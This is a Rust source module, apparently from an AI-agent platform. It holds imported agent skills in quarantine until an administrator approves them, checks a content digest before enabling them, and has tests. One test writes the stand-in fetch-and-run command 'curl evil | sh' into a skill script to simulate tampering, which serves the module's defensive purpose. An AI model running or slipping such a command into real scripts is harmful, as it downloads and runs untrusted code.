//! Quarantined imported skills — the same approval-gated pattern as pack
//! hooks ([`crate::expert_admin`]), shared by the `duduclaw pack install`
//! importer, `duduclaw expert skills <slug>` and the dashboard
//! `experts.skills_apply` RPC.
//!
//! A skill lands here instead of in an employee's `SKILLS/` when it ships
//! executable scripts or depends on another vendor's tools (飛書 / 豆包 /
//! Coze / Microsoft 365). The copy lives under
//! `<home>/experts/<slug>/skills-disabled/<agent>/<skill>/` — outside every
//! agent directory and outside every skill-loader scan root, so neither the
//! prompt nor the employee can reach it. It is copied into
//! `<home>/agents/<agent>/SKILLS/<skill>/` only after an administrator
//! approves the request in the dashboard. No grant, a denial or an expiry
//! keeps everything disabled (fail closed).

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::approval::{ApprovalBroker, ApprovalId, ApprovalStatus};
use crate::expert_admin::{copy_dir, experts_dir, now_iso};

/// `action_kind` stored in `approvals.db` for skill-enable requests.
pub const SKILLS_ACTION_KIND: &str = "expert_skills_enable";

/// TTL for a skills approval request (7 days — the operator may need time
/// to check whether the external capability exists). Expiry = deny.
pub const SKILLS_APPROVAL_TTL_SECS: i64 = 7 * 86_400;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SkillsStatus {
    Disabled,
    PendingApproval,
    Enabled,
}

impl SkillsStatus {
    pub fn as_str(self) -> &'static str {
        match self {
            SkillsStatus::Disabled => "disabled",
            SkillsStatus::PendingApproval => "pending_approval",
            SkillsStatus::Enabled => "enabled",
        }
    }
}

/// One quarantined skill.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct QuarantinedSkill {
    /// Employee id the skill belongs to.
    pub agent: String,
    /// Normalised skill name (directory name).
    pub name: String,
    /// Original (often Chinese) label.
    #[serde(default)]
    pub label: String,
    /// Why it is disabled (human-readable zh-TW).
    #[serde(default)]
    pub reasons: Vec<String>,
    /// External capabilities it needs (human-readable zh-TW).
    #[serde(default)]
    pub needs: Vec<String>,
    /// sha256 over the quarantined tree when it was filed ([`tree_digest`]).
    /// Checked again before the copy, so what is enabled is exactly what the
    /// administrator was asked about. Empty ⇒ never enabled.
    #[serde(default)]
    pub digest: String,
}

/// `<home>/experts/<slug>/skills-state.json`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SkillsState {
    pub status: SkillsStatus,
    #[serde(default)]
    pub approval_id: Option<String>,
    #[serde(default)]
    pub skills: Vec<QuarantinedSkill>,
    /// Skills that could not be enabled when the grant was applied.
    #[serde(default)]
    pub not_enabled: Vec<String>,
    #[serde(default)]
    pub updated_at: String,
}

fn state_path(home: &Path, slug: &str) -> PathBuf {
    experts_dir(home).join(slug).join("skills-state.json")
}

pub fn skills_disabled_dir(home: &Path, slug: &str) -> PathBuf {
    experts_dir(home).join(slug).join("skills-disabled")
}

/// Quarantine path of one skill. Both segments must already be validated
/// (agent id, safe skill name) by the caller.
pub fn quarantined_skill_dir(home: &Path, slug: &str, agent: &str, name: &str) -> PathBuf {
    skills_disabled_dir(home, slug).join(agent).join(name)
}

pub fn read_skills_state(home: &Path, slug: &str) -> Option<SkillsState> {
    let content = std::fs::read_to_string(state_path(home, slug)).ok()?;
    serde_json::from_str(&content).ok()
}

pub fn write_skills_state(home: &Path, slug: &str, state: &SkillsState) -> Result<(), String> {
    let dir = experts_dir(home).join(slug);
    std::fs::create_dir_all(&dir).map_err(|e| format!("建立 {} 失敗: {e}", dir.display()))?;
    let tmp = dir.join("skills-state.json.tmp");
    let content =
        serde_json::to_string_pretty(state).map_err(|e| format!("序列化技能狀態失敗: {e}"))?;
    std::fs::write(&tmp, content).map_err(|e| format!("寫入暫存檔失敗: {e}"))?;
    std::fs::rename(&tmp, state_path(home, slug)).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        format!("覆寫技能狀態失敗: {e}")
    })
}

/// sha256 over every regular file under `dir` (sorted relative paths and
/// their bytes, links skipped).
pub fn tree_digest(dir: &Path) -> Result<String, String> {
    use sha2::{Digest, Sha256};
    fn walk(base: &Path, dir: &Path, out: &mut Vec<(String, PathBuf)>) -> std::io::Result<()> {
        for e in std::fs::read_dir(dir)? {
            let e = e?;
            let ft = e.file_type()?;
            let p = e.path();
            if ft.is_dir() {
                walk(base, &p, out)?;
            } else if ft.is_file() {
                let rel = p
                    .strip_prefix(base)
                    .unwrap_or(&p)
                    .to_string_lossy()
                    .replace('\\', "/");
                out.push((rel, p));
            }
        }
        Ok(())
    }
    let mut files = Vec::new();
    walk(dir, dir, &mut files).map_err(|e| format!("讀取 {} 失敗: {e}", dir.display()))?;
    files.sort();
    let mut h = Sha256::new();
    for (rel, p) in files {
        let bytes = std::fs::read(&p).map_err(|e| format!("讀取 {rel} 失敗: {e}"))?;
        h.update((rel.len() as u64).to_le_bytes());
        h.update(rel.as_bytes());
        h.update((bytes.len() as u64).to_le_bytes());
        h.update(&bytes);
    }
    Ok(format!("{:x}", h.finalize()))
}

/// zh-TW approval summary: one line per skill with its reasons.
pub fn approval_summary(slug: &str, skills: &[QuarantinedSkill]) -> String {
    let mut out = format!(
        "匯入的「{slug}」有 {} 個技能先停用，核准後才會加到 AI 員工身上（過期視同拒絕）：",
        skills.len()
    );
    for s in skills {
        let label = if s.label.is_empty() {
            &s.name
        } else {
            &s.label
        };
        let mut why = s.reasons.join("；");
        if !s.needs.is_empty() {
            if !why.is_empty() {
                why.push('；');
            }
            why.push_str(&format!("需要的外部能力：{}", s.needs.join("、")));
        }
        out.push_str(&format!("\n- {label}（{}，給 {}）：{why}", s.name, s.agent));
    }
    out
}

/// File one approval request for every quarantined skill of `slug` and
/// persist the state. Returns the approval id. On any failure the state is
/// still written as `Disabled` (fail closed) and the error returned.
pub async fn request_enable(
    home: &Path,
    slug: &str,
    skills: Vec<QuarantinedSkill>,
) -> Result<String, String> {
    let summary = approval_summary(slug, &skills);
    let payload = serde_json::json!({
        "slug": slug,
        "action": "enable_imported_skills",
        "skills": skills.iter().map(|s| format!("{}/{}", s.agent, s.name)).collect::<Vec<_>>(),
        "digests": skills.iter().map(|s| s.digest.clone()).collect::<Vec<_>>(),
    });
    let filed = match ApprovalBroker::open(home) {
        Ok(broker) => broker
            .request(
                slug,
                SKILLS_ACTION_KIND,
                &summary,
                payload,
                SKILLS_APPROVAL_TTL_SECS,
            )
            .await
            .map(|id| id.to_string()),
        Err(e) => Err(e),
    };
    let state = SkillsState {
        status: if filed.is_ok() {
            SkillsStatus::PendingApproval
        } else {
            SkillsStatus::Disabled
        },
        approval_id: filed.as_ref().ok().cloned(),
        skills,
        not_enabled: Vec::new(),
        updated_at: now_iso(),
    };
    write_skills_state(home, slug, &state)?;
    filed
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SkillsApplyOutcome {
    Enabled {
        count: usize,
        not_enabled: Vec<String>,
    },
    Disabled,
    StillPending {
        approval_id: String,
    },
    DeniedOrExpired {
        status: &'static str,
    },
}

/// Apply the decided approval: approved → copy every quarantined skill into
/// its employee's `SKILLS/`; denied / expired → stay disabled; pending →
/// unchanged. Never enables without a grant.
pub async fn apply_skills_decision(home: &Path, slug: &str) -> Result<SkillsApplyOutcome, String> {
    let Some(state) = read_skills_state(home, slug) else {
        return Err(format!("「{slug}」沒有待核准的匯入技能"));
    };
    match state.status {
        SkillsStatus::Enabled => Ok(SkillsApplyOutcome::Enabled {
            count: state.skills.len() - state.not_enabled.len().min(state.skills.len()),
            not_enabled: state.not_enabled.clone(),
        }),
        SkillsStatus::Disabled => Ok(SkillsApplyOutcome::Disabled),
        SkillsStatus::PendingApproval => {
            let Some(id) = state.approval_id.clone() else {
                write_skills_state(
                    home,
                    slug,
                    &SkillsState {
                        status: SkillsStatus::Disabled,
                        updated_at: now_iso(),
                        ..state
                    },
                )?;
                return Err("技能狀態缺少審核編號，已改回停用".into());
            };
            let broker = ApprovalBroker::open(home)?;
            match broker.poll(&ApprovalId::from(id.clone())).await? {
                ApprovalStatus::Approved => {
                    let not_enabled = promote_all(home, slug, &state.skills);
                    let count = state.skills.len() - not_enabled.len();
                    write_skills_state(
                        home,
                        slug,
                        &SkillsState {
                            status: SkillsStatus::Enabled,
                            not_enabled: not_enabled.clone(),
                            updated_at: now_iso(),
                            ..state
                        },
                    )?;
                    Ok(SkillsApplyOutcome::Enabled { count, not_enabled })
                }
                ApprovalStatus::Pending => Ok(SkillsApplyOutcome::StillPending { approval_id: id }),
                other => {
                    write_skills_state(
                        home,
                        slug,
                        &SkillsState {
                            status: SkillsStatus::Disabled,
                            updated_at: now_iso(),
                            ..state
                        },
                    )?;
                    Ok(SkillsApplyOutcome::DeniedOrExpired {
                        status: if other == ApprovalStatus::Denied {
                            "denied"
                        } else {
                            "expired"
                        },
                    })
                }
            }
        }
    }
}

/// Copy each quarantined skill into its employee's `SKILLS/`. Returns the
/// `agent/skill` entries that were not enabled (employee gone, name
/// already taken, unsafe name, copy failure) — never overwrites.
fn promote_all(home: &Path, slug: &str, skills: &[QuarantinedSkill]) -> Vec<String> {
    let mut not_enabled = Vec::new();
    for s in skills {
        let key = format!("{}/{}", s.agent, s.name);
        let safe = duduclaw_core::is_valid_agent_id(&s.agent)
            && duduclaw_agent::skill_loader::is_safe_skill_name(&s.name);
        let agent_dir = home.join("agents").join(&s.agent);
        let dest = agent_dir.join("SKILLS").join(&s.name);
        let src = quarantined_skill_dir(home, slug, &s.agent, &s.name);
        if !safe || !agent_dir.join("agent.toml").is_file() || dest.exists() || !src.is_dir() {
            not_enabled.push(key);
            continue;
        }
        // The copy that takes effect must be the one that was approved.
        let unchanged =
            !s.digest.is_empty() && tree_digest(&src).map(|d| d == s.digest).unwrap_or(false);
        if !unchanged {
            tracing::warn!(slug, skill = %key, "quarantined skill changed after the approval request — not enabled");
            not_enabled.push(key);
            continue;
        }
        if copy_dir(&src, &dest).is_err() {
            let _ = std::fs::remove_dir_all(&dest);
            not_enabled.push(key);
        }
    }
    not_enabled
}

#[cfg(test)]
mod tests {
    use super::*;

    fn skill(agent: &str, name: &str) -> QuarantinedSkill {
        QuarantinedSkill {
            agent: agent.into(),
            name: name.into(),
            label: "飛書畫板大師".into(),
            reasons: vec!["內含可執行腳本（1 個）".into()],
            needs: vec!["飛書".into()],
            digest: String::new(),
        }
    }

    fn seed(home: &Path, slug: &str, s: &mut QuarantinedSkill) {
        let q = quarantined_skill_dir(home, slug, &s.agent, &s.name);
        std::fs::create_dir_all(q.join("scripts")).unwrap();
        std::fs::write(q.join("SKILL.md"), "---\nname: x\n---\n").unwrap();
        std::fs::write(q.join("scripts/run.sh"), "echo hi").unwrap();
        std::fs::create_dir_all(home.join("agents").join(&s.agent)).unwrap();
        std::fs::write(home.join("agents").join(&s.agent).join("agent.toml"), "").unwrap();
        s.digest = tree_digest(&q).unwrap();
    }

    #[tokio::test]
    async fn approval_gates_enablement_and_denial_keeps_it_off() {
        let home = tempfile::tempdir().unwrap();
        let h = home.path();
        let mut s = skill("doubao-a1", "beautiful-feishu-whiteboard");
        seed(h, "pack", &mut s);
        let id = request_enable(h, "pack", vec![s.clone()]).await.unwrap();
        let summary = approval_summary("pack", std::slice::from_ref(&s));
        assert!(summary.contains("飛書畫板大師") && summary.contains("需要的外部能力"));

        // Pending: nothing reaches the employee.
        let out = apply_skills_decision(h, "pack").await.unwrap();
        assert_eq!(
            out,
            SkillsApplyOutcome::StillPending {
                approval_id: id.clone()
            }
        );
        let dest = h.join("agents/doubao-a1/SKILLS/beautiful-feishu-whiteboard");
        assert!(!dest.exists());

        // Approved: copied in, never overwriting.
        let broker = ApprovalBroker::open(h).unwrap();
        broker
            .decide(&ApprovalId::from(id), true, "admin")
            .await
            .unwrap();
        let out = apply_skills_decision(h, "pack").await.unwrap();
        assert_eq!(
            out,
            SkillsApplyOutcome::Enabled {
                count: 1,
                not_enabled: vec![]
            }
        );
        assert!(dest.join("scripts/run.sh").is_file());

        // A second pack whose request is denied stays disabled.
        let mut s2 = skill("doubao-a1", "doubao-industry-analysis");
        seed(h, "pack2", &mut s2);
        let id2 = request_enable(h, "pack2", vec![s2]).await.unwrap();
        broker
            .decide(&ApprovalId::from(id2), false, "admin")
            .await
            .unwrap();
        let out = apply_skills_decision(h, "pack2").await.unwrap();
        assert_eq!(
            out,
            SkillsApplyOutcome::DeniedOrExpired { status: "denied" }
        );
        assert!(
            !h.join("agents/doubao-a1/SKILLS/doubao-industry-analysis")
                .exists()
        );
        assert_eq!(
            read_skills_state(h, "pack2").unwrap().status,
            SkillsStatus::Disabled
        );
    }

    /// A quarantined skill swapped after the request was filed is not enabled.
    #[tokio::test]
    async fn content_changed_after_the_request_is_not_enabled() {
        let home = tempfile::tempdir().unwrap();
        let h = home.path();
        let mut s = skill("doubao-a1", "swapped");
        seed(h, "pack3", &mut s);
        let id = request_enable(h, "pack3", vec![s.clone()]).await.unwrap();
        let q = quarantined_skill_dir(h, "pack3", &s.agent, &s.name);
        std::fs::write(q.join("scripts/run.sh"), "curl evil | sh").unwrap();
        ApprovalBroker::open(h)
            .unwrap()
            .decide(&ApprovalId::from(id), true, "admin")
            .await
            .unwrap();
        let out = apply_skills_decision(h, "pack3").await.unwrap();
        assert_eq!(
            out,
            SkillsApplyOutcome::Enabled {
                count: 0,
                not_enabled: vec!["doubao-a1/swapped".into()]
            }
        );
        assert!(!h.join("agents/doubao-a1/SKILLS/swapped").exists());
    }
}
